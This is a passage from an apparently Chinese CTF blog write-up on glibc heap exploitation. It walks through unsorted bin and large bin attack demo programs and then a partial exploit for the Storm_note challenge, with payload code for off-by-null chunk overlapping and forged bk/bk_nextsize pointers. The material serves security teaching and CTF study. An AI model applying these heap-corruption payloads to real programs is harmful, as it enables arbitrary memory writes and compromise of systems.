class="hljs-string">&quot;现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\n\n&quot;</span>,(<span class="hljs-keyword">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="hljs-keyword">void</span>*)stack_var);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​    编译完成之后分别在10、13、16、19行下断点。</p>
<p>​    然后运行，一开始先申请两个chunk，第二个是为了防止和top chunk合并。</p>
<p> <img src="https://s2.loli.net/2021/12/26/AslPx52ywJGFWMf.png" srcset="/img/loading.gif" lazyload></p>
<p>​    当free之后，这个chunk的fd、bk都指向了unsorted bin的位置，因为unsorted bin是双向链表。</p>
<p> <img src="https://s2.loli.net/2021/12/26/nWIehUSBNYQKbVr.png" srcset="/img/loading.gif" lazyload></p>
<p>   继续，通过p[1] = (unsigned long)(&amp;stack_var - 2)，把bk指针给改掉了。unsigned long是8字节大小的，所以减去2之后正好是在address 这个地方。</p>
<p> <img src="https://s2.loli.net/2021/12/26/ezX5kUS1lRtJgVB.png" srcset="/img/loading.gif" lazyload></p>
<p>​    然后再去申请的时候需要把释放的那一块给拿出来，操作如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><span class="hljs-comment">//bck = chunk-&gt;bkunsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av);</span><br></code></pre></td></tr></table></figure>

<p>  把unsorted bin的bk改为chunk的bk，然后将chunk的bk所指向的 fd改为unsorted bin的地址。</p>
<p> <img src="https://s2.loli.net/2021/12/26/INPjVX1byFdmBAg.png" srcset="/img/loading.gif" lazyload>    </p>
<p> <img src="https://s2.loli.net/2021/12/26/RGsX3Ul2ywgC9p8.png" srcset="/img/loading.gif" lazyload></p>
<p>   因为对于一个chunk来说，chunk头是占据0x10大小的（也就是图中 address），所以fd正好是我们想要改的那个地址。</p>
<p> <img src="https://s2.loli.net/2021/12/26/DJbhTS1ERQCc2VF.png" srcset="/img/loading.gif" lazyload></p>
<p> <img src="https://s2.loli.net/2021/12/26/HPVgs8etxRNj7bo.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h2><p>​    回顾一下large bin的概念，large bin大小：大于1024字节</p>
<p>   双向循环链表，先进先出，按照从大到小排序</p>
<p>   当有空闲块相邻的时候，chunk会被合并</p>
<p>   除了fd、bk指针还有fd_nextsize和bk_nextsize</p>
<p>​    源码如下。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;根据原文描述跟 unsorted bin attack 实现的功能差不多，都是把一个地址的值改为一个很大的数\n\n&quot;</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先来看一下目标:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x320</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;分配第一个 large chunk: %p\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再分配一个 fastbin 大小的 chunk，来避免 free 的时候下一个 large chunk 与第一个合并了\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请第二个 large chunk 在: %p\n&quot;</span>, p2 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;同样在分配一个 fastbin 大小的 chunk 防止合并掉\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;最后申请第三个 large chunk 在: %p\n&quot;</span>, p3 - <span class="hljs-number">2</span>);<br> <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请一个 fastbin 大小的防止 free 的时候第三个 large chunk 与 top chunk 合并\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉第一个和第二个 chunk，他们会被放在 unsorted bin 中 [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)(p2 - <span class="hljs-number">2</span>), (<span class="hljs-keyword">void</span> *)(p2[<span class="hljs-number">0</span>]));<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在去申请一个比他俩小的，然后会把第一个分割出来，第二个则被整理到 largebin 中，第一个剩下的会放回到 unsortedbin 中 [ %p ]\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)((<span class="hljs-keyword">char</span> *)p1 + <span class="hljs-number">0x90</span>));<br><br>    <span class="hljs-built_in">free</span>(p3);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉第三个，他会被放到 unsorted bin 中: [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)(p3 - <span class="hljs-number">2</span>), (<span class="hljs-keyword">void</span> *)(p3[<span class="hljs-number">0</span>]));<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;假设有个漏洞，可以覆盖掉第二个 chunk 的 \&quot;size\&quot; 以及 \&quot;bk\&quot;、\&quot;bk_nextsize\&quot; 指针\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;减少释放的第二个 chunk 的大小强制 malloc 把将要释放的第三个 large chunk 插入到 largebin 列表的头部（largebin 会按照大小排序）。覆盖掉栈变量。覆盖 bk 为 stack_var1-0x10，bk_nextsize 为 stack_var2-0x20\n\n&quot;</span>);<br><br>    p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;<br>    p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>    p2[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);<br>    p2[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再次 malloc，会把释放的第三个 chunk 插入到 largebin 中，同时我们的目标已经改写了:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-keyword">void</span> *)stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-keyword">void</span> *)stack_var2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​    该技术可用于修改任意地址的值，例如栈上的变量stack_var1和 stack_var2。在实践中常常作为其他漏洞利用的前奏，例如在fastbin attack 中用于修改全局变量global_max_fast为一个很大的值。</p>
<p>​    首先我们分配 chunk p1, p2 和 p3，并且在它们之间插入其他的 chunk 以防止在释放时被合并。</p>
<p> <img src="https://s2.loli.net/2021/12/26/EPrmF1XuZSLHvw3.png" srcset="/img/loading.gif" lazyload></p>
<p>​    接下来释放p1和p2，它们被放入unsorted bin中。</p>
<p>  <img src="https://s2.loli.net/2021/12/26/k1BqnwV7jJ9hEe6.png" srcset="/img/loading.gif" lazyload></p>
<p>​    接下来去申请一个0x90大小的堆块，他会把前面那个0x320大小的堆块切割，同时会给unsorted bin中的free chunk进行整理划分，把那第二块大的放到large bin，第一个剩余的放回到unsorted bin中。</p>
<p> <img src="https://s2.loli.net/2021/12/26/FLhHWCkbZzlNr7i.png" srcset="/img/loading.gif" lazyload></p>
<p>​    接着free掉p3，将其放入unsorted bin，我们伪造的分别是p2的size、bk以及bk_nextsize，紧接着进行malloc操作，将p3整合进large bin。</p>
<p>  <img src="https://s2.loli.net/2021/12/26/6mf2nzNps5M79lZ.png" srcset="/img/loading.gif" lazyload></p>
<p>​    Large bin是按照fd指针的顺序从大到小排列的，所以需要进行排序，排序的操作大概是：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//victim是p3、fwd是修改后的p2</span><br>&#123;<br>    victim-&gt;fd_nextsize = fwd;<span class="hljs-comment">//1</span><br>    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="hljs-comment">//2</span><br>    fwd-&gt;bk_nextsize = victim;<span class="hljs-comment">//3</span><br>    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="hljs-comment">//4</span><br>&#125;<br>victim-&gt;bk = bck;<br>victim-&gt;fd = fwd;<br>fwd-&gt;bk = victim;<br>bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure>

<p>​    把2带入4得到：fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim，同时下面有：fwd-&gt;bk=victim。也就是说之前我们伪造的p2的bk跟bk_nextsize指向的地址被改为了victim，即(unsigned long)(&amp;stack_var1 - 2)与(unsigned long)(&amp;stack_var2 - 4)被改为了victim。</p>
<p> <img src="https://s2.loli.net/2021/12/26/Usu5Bhy3J1IkLlP.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="西湖论剑Storm-note"><a href="#西湖论剑Storm-note" class="headerlink" title="西湖论剑Storm_note"></a>西湖论剑<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-254849.htm">Storm_note</a></h2><p>赛题下载后，checksec查看程序的保护机制 </p>
<p><img src="https://s2.loli.net/2021/12/26/UICXhL4nvl8bEVy.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="init-proc函数"><a href="#init-proc函数" class="headerlink" title="init_proc函数"></a>init_proc函数</h4><p>​    程序一开始就对进程进行初始化，<code>mallopt(1, 0)</code>禁用了fastbin，然后通过mmap在0xABCD0000分配了一个页面的可读可写空间，最后往里面写入一个随机数。 </p>
<p><img src="https://s2.loli.net/2021/12/26/jcaBrYehQ29wHJp.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="alloc-note函数"><a href="#alloc-note函数" class="headerlink" title="alloc_note函数"></a>alloc_note函数</h4><p>​    首先遍历全局变量note，找到一个没有存放内容的地方保存堆指针。然后限定了申请的堆的大小最多为0xFFFFF，调用calloc函数来分配堆空间，因此返回</p>
<p>前会对分配的堆的内容进行清零。</p>
<p> <img src="https://s2.loli.net/2021/12/26/BgMTDC7jNW9Vnbc.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="edit-note函数"><a href="#edit-note函数" class="headerlink" title="edit_note函数"></a>edit_note函数</h4><p>​     存在一个off_by_null漏洞，在read后v2保存写入的字节数，最后在该偏移处的字节置为0，形成off_by_null。</p>
<p> <img src="https://s2.loli.net/2021/12/26/NcRMZmEYb3sAyVp.png" srcset="/img/loading.gif" lazyload>    </p>
<h4 id="delete-note函数"><a href="#delete-note函数" class="headerlink" title="delete_note函数"></a>delete_note函数</h4><p>​    这个函数就是正常free堆指针，并置0。</p>
<p> <img src="https://s2.loli.net/2021/12/26/sS1oNBz9LEM5UdQ.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="backdoor函数"><a href="#backdoor函数" class="headerlink" title="backdoor函数"></a>backdoor函数</h4><p>​    程序提供一个可以直接getshell的后门，触发的条件就是输入的数据与mmap映射的空间的前48个字节相同。</p>
<p> <img src="https://s2.loli.net/2021/12/26/m3eKYposyubTgCq.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
<li><p>利用off_by_null漏洞实现chunk overlapping，从而控制堆块内容。</p>
</li>
<li><p>将处于unsortedbin的可控制的chunk放入largebin中，以便触发largebin attack</p>
</li>
<li><p>伪造largebin的bk和bk_nextsize指针，通过malloc触发漏洞，分配到目标地址，实现任意地址写。</p>
</li>
<li><p>触发后门</p>
</li>
</ol>
<h3 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h3><h4 id="1-Chunk-overlapping"><a href="#1-Chunk-overlapping" class="headerlink" title="1.Chunk overlapping"></a>1.Chunk overlapping</h4><p>​    首先分配7个chunk，chunk1和chunk4是用于放入largebin的大chunk，chunk6防止top chunk合并。Chunk结构如下。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x508</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#2</span><br><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x508</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#6</span><br></code></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2021/12/26/1Z9ExJODHmry2uw.png" srcset="/img/loading.gif" lazyload></p>
<p>​    构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。如下图所示。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x4f0</span>+p64(<span class="hljs-number">0x500</span>)) <span class="hljs-comment">#prev_size</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x4f0</span>+p64(<span class="hljs-number">0x500</span>)) <span class="hljs-comment">#prev_size</span><br></code></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2021/12/26/IQHym7GTUNXRkE4.png" srcset="/img/loading.gif" lazyload></p>
<p>​    接着利用off by null漏洞改写chunk 1的size为0x500。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>) <span class="hljs-comment">#off by null</span><br></code></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2021/12/26/x2lRQHnNWmoy6b1.png" srcset="/img/loading.gif" lazyload></p>
<p>​    然后就可以进行chunk overlap了, 先将0x20的chunk释放掉，然后释放chunk2，这时触发unlink。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x4d8</span>) <span class="hljs-comment">#7 </span><br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)    <span class="hljs-comment">#overlap</span><br></code></pre></td></tr></table></figure>

<p> <img src="https://s2.loli.net/2021/12/26/6N4o2xGqDPghuHO.png" srcset="/img/loading.gif" lazyload></p>
<p>​    接下来用同样的方法对第二个大小为0x510的chunk进行overlapping。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>) <span class="hljs-comment">#off by null</span><br>add(<span class="hljs-number">0x18</span>)        <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x4d8</span>)       <span class="hljs-comment">#8 </span><br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>)          <span class="hljs-comment">#overlap</span><br>add(<span class="hljs-number">0x40</span>)        <span class="hljs-comment">#4 </span><br>edit(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h4 id="2-放入large-bin"><a href="#2-放入large-bin" class="headerlink" title="2.放入large bin"></a>2.放入large bin</h4><p>​    那么如何将unsorted bin中的chunk放入large bin呢？下面是glibc判断</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class="hljs-comment">//从第一个unsortedbin的bk开始遍历</span><br>&#123;<br>    bck = victim-&gt;bk;<br>    size = chunksize (victim);<br>    <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<span class="hljs-comment">//&lt;_int_malloc+627&gt;</span><br>        bck == unsorted_chunks (av) &amp;&amp;<br>        victim == av-&gt;last_remainder &amp;&amp;<br>        (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE))    <span class="hljs-comment">//unsorted_bin的最后一个，并且该bin中的最后一个chunk的size大于我们申请的大小</span><br>    &#123;remainder_size = size - nb;<br>     remainder = chunk_at_offset (victim, nb);...&#125;<span class="hljs-comment">//将选中的chunk剥离出来，恢复unsortedbin</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>            malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>     unsorted_chunks (av)-&gt;bk = bck;    <span class="hljs-comment">//largebin attack</span><br>    <span class="hljs-comment">//注意这个地方，将unsortedbin的bk设置为victim-&gt;bk，如果我设置好了这个bk并且能绕过上面的检查,下次分配就能将target chunk分配出来</span><br>    <span class="hljs-keyword">if</span> (size == nb)<span class="hljs-comment">//size相同的情况同样正常分配</span><br>    <span class="hljs-keyword">if</span> (in_smallbin_range (size))<span class="hljs-comment">//放入smallbin</span><br>     &#123;<br>        victim_index = smallbin_index (size);<br>        bck = bin_at (av, victim_index);<br>        fwd = bck-&gt;fd;<br>     &#125;<br>     <span class="hljs-keyword">else</span><span class="hljs-comment">//放入large bin</span><br>     &#123;<br>         <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; chunksize_nomask (fwd))<br>         &#123;<br>            fwd = fwd-&gt;fd_nextsize;<span class="hljs-comment">//fd_nextsize指向比当前chunk小的下一个chunk</span><br>            assert (chunk_main_arena (fwd));<br>          &#125;<br>          <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size<br>                          == (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) chunksize_nomask (fwd))<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>             fwd = fwd-&gt;fd;<br>          <span class="hljs-keyword">else</span><span class="hljs-comment">// 插入</span><br>          &#123;<br>            <span class="hljs-comment">//解链操作，nextsize只有largebin才有</span><br>            victim-&gt;fd_nextsize = fwd;<br>            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>            fwd-&gt;bk_nextsize = victim;<br>            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="hljs-comment">//fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim</span><br>           &#125;<br>          bck = fwd-&gt;bk;<br>      &#125;<br>   &#125;<br> <span class="hljs-keyword">else</span><br>     victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>&#125;<br> mark_bin (av, victim_index);<br><span class="hljs-comment">//解链操作2,fd,bk</span><br> victim-&gt;bk = bck;<br> victim-&gt;fd = fwd;<br> fwd-&gt;bk = victim;<br> bck-&gt;fd = victim;<br><span class="hljs-comment">//fwd-&gt;bk-&gt;fd=victim</span><br></code></pre></td></tr></table></figure>

<p>​    大概意思就是说我们申请堆块时，glibc会从unsorted bin末尾开始遍历，倘若遍历到不符合我们的要求大小，那么系统会做sorted——重新把这个free chunk放入small bin或large bin中。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">2</span>)     <span class="hljs-comment">#unsortedbin-&gt; chunk2 -&gt; chunk5(0x4e0)which size is largebin FIFO</span><br>add(<span class="hljs-number">0x4e8</span>)  <span class="hljs-comment">#put chunk5(0x4e0) to largebin</span><br>free(<span class="hljs-number">2</span>)     <span class="hljs-comment">#put chunk2 to unsortedbin</span><br></code></pre></td></tr></table></figure>

<p>​    这个过程就是，在unsorted bin中存放着两个大chunk，第一个0x4e0，第二个0x4f0。当我申请一个0x4e8的chunk时，首先找到0x4e0的chunk，太小了不符合调件，于是将它拿出unsorted bin，放入large bin。在放入large bin时就会进行两步解链操作，两个解链操作的最后一步是关键。</p>
<p> <img src="https://s2.loli.net/2021/12/26/rlAmkNfTFjqy6aX.png" srcset="/img/loading.gif" lazyload></p>
<p>​    可以看到从unsorted bin-&gt;bk开始遍历，第一个的size &lt; nb因此就会放入large bin，继续往前遍历，找到0x4f0的chunk，刚好满足size==nb，因此将其分配出来。最后在free(2)将刚刚分配的chunk2再放回unsorted bin，进行第二次利用。</p>
<p> <img src="https://s2.loli.net/2021/12/26/nR4rjuL1OTYPeQJ.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="3-large-bin-attack"><a href="#3-large-bin-attack" class="headerlink" title="3.large bin attack"></a>3.large bin attack</h4><p>​    接下来伪造unsorted bin的bk</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">content_addr = <span class="hljs-number">0xabcd0100</span><br>fake_chunk = content_addr - <span class="hljs-number">0x20</span><br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4f1</span>) <span class="hljs-comment"># size</span><br>payload += p64(<span class="hljs-number">0</span>) + p64(fake_chunk)      <span class="hljs-comment"># bk</span><br>edit(<span class="hljs-number">7</span>, payload)<br></code></pre></td></tr></table></figure>

<p>​    效果图如下。</p>
<p> <img src="https://s2.loli.net/2021/12/26/nAIwNXGPojFuUD4.png" srcset="/img/loading.gif" lazyload></p>
<p>​    再伪造large bin的bk和bk_nextsize。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload2 = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4e1</span>)  <span class="hljs-comment">#size</span><br>payload2 += p64(<span class="hljs-number">0</span>) + p64(fake_chunk+<span class="hljs-number">8</span>)   <br>payload2 += p64(<span class="hljs-number">0</span>) + p64(fake_chunk-<span class="hljs-number">0x18</span>-<span class="hljs-number">5</span>)<span class="hljs-comment">#mmap</span><br>edit(<span class="hljs-number">8</span>, payload2)<br></code></pre></td></tr></table></figure>

